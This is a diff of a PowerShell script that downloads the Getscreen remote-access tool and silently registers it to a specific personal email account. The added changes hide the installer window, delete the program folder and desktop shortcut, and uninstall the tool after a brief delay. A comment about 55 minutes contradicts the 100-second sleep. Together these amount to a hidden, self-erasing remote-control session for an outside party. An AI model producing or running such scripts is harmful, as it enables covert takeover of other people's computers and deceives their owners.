@@ -14,14 +14,11 @@ function Install-Getscreen {
             Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction Continue
         }
     }
-    #Cd to the directory where getscreen installer is located
-    #Set-Location -Path $PSScriptRoot
-    #Installing getscreen without user interaction and verbose logging
-    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register tancorovruslan@gmail.com:10791" -Wait -ErrorAction Stop
+    #Installing getscreen without user interaction and detaching from the current session
+    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register tancorovruslan@gmail.com:10791" -Wait -ErrorAction Stop -WindowStyle Hidden
 }
 
-#Function that deletes a service by name
-function Remove-Service {
+function Remove-Service { #Function that deletes a service by name
     param (
         [Parameter(Mandatory = $true)]
         [string]$ServiceName
@@ -32,8 +29,10 @@ function Remove-Service {
     }
 }
 
+Remove-Item -Path "C:\ProgramData\Getscreen" -Recurse -Force
 Remove-Service -ServiceName "Getscreen" -ErrorAction SilentlyContinue
 Install-Getscreen
+Remove-Item -Path "$env:USERPROFILE\Desktop\Getscreen.lnk" -Force
 
 #Check if getscreen is installed
     if (Test-Path "C:\Program Files\Getscreen\getscreen.exe") {
@@ -44,7 +43,7 @@ Install-Getscreen
     }
 
 #Uninstall getscreen after 55 minutes
-Start-Sleep -Seconds 240
+Start-Sleep -Seconds 100
 Start-Process -FilePath "C:\Program Files\Getscreen\getscreen.exe" -ArgumentList "-uninstall" -Wait -ErrorAction Stop
 
 #Remove getscreen installer
